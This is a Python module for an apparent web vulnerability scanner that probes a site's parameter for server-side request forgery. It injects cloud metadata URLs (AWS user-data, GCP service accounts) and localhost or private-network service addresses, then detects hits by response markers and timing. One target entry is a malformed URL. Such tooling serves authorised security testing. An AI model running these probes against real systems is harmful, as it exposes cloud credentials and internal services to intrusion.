"""
SSRF Internal Scanner — Cloud Metadata + Port Scan + Timing Detection.

Probes SSRF-vulnerable parameters against:
- Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean, Alibaba)
- Internal services (HTTP, Redis, MySQL, PostgreSQL, Docker, K8s, Jenkins)
- Timing-based port scan (fast, no response body needed)
"""
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


# Cloud Metadata Targets

CLOUD_METADATA = [
    # AWS (IMDSv1)
    ("http://169.254.169.254/latest/meta-data/", "aws", ["ami-id", "instance-id", "instance-type", "security-groups"]),
    ("http://169.254.169.254/latest/user-data/", "aws", ["ssh-rsa", "#!/bin", "cloud-init"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true", "gcp",
     ["instance-id", "project-id", "service-accounts"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "gcp", ["email", "scopes"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure",
     ["compute", "network", "osProfile"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1.json", "do", ["droplet_id", "region", "hostname"]),
    ("http://169.254.169.254/metadata/v1/user-data", "do", ["#!/bin", "cloud-config"]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", "alibaba", ["instance-id", "region-id", "image-id"]),
    # Generic
    ("http://169.254.169.254/", "aws", ["meta-data", "user-data"]),
]

# Internal Service Ports

INTERNAL_SERVICES = [
    # (target, port, service_name, detection_marker)
    ("http://127.0.0.1:80", 80, "HTTP (80)", "Server:"),
    ("http://127.0.0.1:8080", 8080, "HTTP (8080)", "Server:"),
    ("http://127.0.0.1:3000", 3000, "Node/React (3000)", None),
    ("http://127.0.0.1:5000", 5000, "Flask (5000)", None),
    ("http://127.0.0.1:8000", 8000, "Django (8000)", None),
    ("http://127.0.0.1:8443", 8443, "HTTPS-alt (8443)", None),
    ("http://127.0.0.1:9200", 9200, "Elasticsearch", "cluster_name"),
    ("http://127.0.0.1:6379", 6379, "Redis", "-NOAUTH"),
    ("http://127.0.0.1:3306", 3306, "MySQL", "mysql_native_password"),
    ("http://127.0.0.1:5432", 5432, "PostgreSQL", None),
    ("http://127.0.0.1:27017", 27017, "MongoDB", "MongoDB"),
    ("http://127.0.0.1:2375", 2375, "Docker (unsecured)", "Docker"),
    ("http://127.0.0.1:6443", 6443, "K8s API", "kubernetes"),
    ("http://127.0.0.1:8088", 8088, "Jenkins", "Jenkins"),
    ("http://127.0.0.1:9090", 9090, "Prometheus", "Prometheus"),
    ("http://127.0.0.1:8545", 8545, "Ethereum RPC", "jsonrpc"),
    ("http://127.0.0.1:169.254.169.254", 80, "AWS IMDS (alt)", "ami-id"),
    # Common private IP ranges
    ("http://10.0.0.1:80", 80, "Private GW (10.0.0.1)", None),
    ("http://10.0.0.138:80", 80, "Private (10.0.0.138)", None),
    ("http://172.16.0.1:80", 80, "Docker GW (172.16.0.1)", None),
    ("http://192.168.1.1:80", 80, "Router (192.168.1.1)", None),
]


class SSRFScanner:
    """Internal SSRF probe engine — cloud metadata + port scan."""

    def __init__(self, engine, session_manager=None):
        self.engine = engine
        self.session_manager = session_manager

    def _inject(self, url: str, param: str, ssrf_target: str) -> str:
        """Inject SSRF target URL into vulnerable parameter."""
        parts = urlparse(url)
        query = parse_qsl(parts.query, keep_blank_values=True)
        found = False
        for i, (k, v) in enumerate(query):
            if k == param:
                query[i] = (k, ssrf_target)
                found = True
                break
        if not found:
            query.append((param, ssrf_target))
        return urlunparse((parts.scheme, parts.netloc, parts.path,
                           urlencode(query), parts.fragment))

    async def _send_probe(self, url: str, param: str, ssrf_target: str,
                          timeout: float = 5) -> dict:
        """Send SSRF probe via engine."""
        target = self._inject(url, param, ssrf_target)
        return await self.engine.ahttp_send(
            target, timeout=timeout,
            state_context=self.session_manager,
        )

    async def _baseline(self, url: str, param: str) -> tuple:
        """Measure baseline response time with safe value."""
        safe = "http://127.255.255.255:1/nonexistent"
        t0 = time.time()
        r = await self._send_probe(url, param, safe, timeout=5)
        elapsed = r.get("time", time.time() - t0) if isinstance(r, dict) else time.time() - t0
        return elapsed, r

    # Cloud Metadata Scan

    async def scan_cloud_metadata(self, url: str, param: str) -> list[dict]:
        """Probe cloud metadata endpoints. Returns findings on hit."""
        findings = []
        baseline_time, _ = await self._baseline(url, param)

        for target, provider, markers in CLOUD_METADATA:
            try:
                r = await self._send_probe(url, param, target, timeout=6)
                if not isinstance(r, dict):
                    continue

                body = (r.get("body") or "")[:2000]
                status = r.get("status", 0)
                resp_time = r.get("time", 0)

                # Detection: status 200 + cloud markers in body
                if status == 200 and body:
                    for marker in markers:
                        if marker.lower() in body.lower():
                            findings.append({
                                "type": "ssrf_cloud_metadata",
                                "title": f"SSRF: {provider.upper()} Metadata",
                                "url": url[:200],
                                "detail": f"Param: {param}, Provider: {provider}, "
                                          f"Endpoint: {target[:60]}, Marker: {marker}",
                                "param": param,
                                "confidence": "confirmed",
                            })
                            break

                # Detection: timing anomaly (response much faster than baseline to dead IP)
                if resp_time > 0 and baseline_time > 0:
                    if resp_time < baseline_time * 0.3 and status > 0:
                        findings.append({
                            "type": "ssrf_cloud_metadata",
                            "title": f"SSRF Timing: {provider.upper()} reachable",
                            "url": url[:200],
                            "detail": f"Param: {param}, Target: {target[:50]}, "
                                      f"Time: {resp_time:.2f}s (baseline: {baseline_time:.2f}s)",
                            "param": param,
                            "confidence": "suspected",
                        })

            except Exception:
                continue

        return findings

    # Internal Port Scan

    async def scan_internal_ports(self, url: str, param: str,
                                   max_ports: int = 15) -> list[dict]:
        """Timing-based internal port scan. Fast — no response body parsing needed."""
        findings = []
        baseline_time, baseline_r = await self._baseline(url, param)

        for target, port, service_name, marker in INTERNAL_SERVICES[:max_ports]:
            try:
                r = await self._send_probe(url, param, target, timeout=5)
                if not isinstance(r, dict):
                    continue

                status = r.get("status", 0)
                body = (r.get("body") or "")[:500]
                resp_time = r.get("time", 0)

                detected = False
                detail = ""

                # Method 1: HTTP status returned (service responded)
                if status > 0 and status != baseline_r.get("status", 0):
                    detected = True
                    detail = f"Status {status} on {target}"

                # Method 2: Timing anomaly (response significantly faster than dead-end baseline)
                elif resp_time > 0 and baseline_time > 0 and resp_time < baseline_time * 0.5:
                    detected = True
                    detail = f"Timing: {resp_time:.2f}s vs baseline {baseline_time:.2f}s"

                # Method 3: Content marker
                elif marker and body and marker.lower() in body.lower():
                    detected = True
                    detail = f"Marker: '{marker}' in response"

                if detected:
                    findings.append({
                        "type": "ssrf_internal_service",
                        "title": f"SSRF: {service_name}",
                        "url": url[:200],
                        "detail": f"Param: {param}, {detail}",
                        "param": param,
                        "internal_target": f"{target}:{port}",
                        "confidence": "confirmed" if marker and body and marker.lower() in body.lower() else "suspected",
                    })

            except Exception:
                continue

        return findings

    # Full Scan

    async def scan(self, url: str, param: str) -> list[dict]:
        """Run full SSRF internal scan: cloud + ports."""
        if not url or not param:
            return []

        findings = []

        # Cloud metadata (fast — 9 targets)
        cloud = await self.scan_cloud_metadata(url, param)
        findings.extend(cloud)

        # If cloud metadata found, ports likely accessible too
        max_ports = 15 if cloud else 10
        ports = await self.scan_internal_ports(url, param, max_ports=max_ports)
        findings.extend(ports)

        return findings
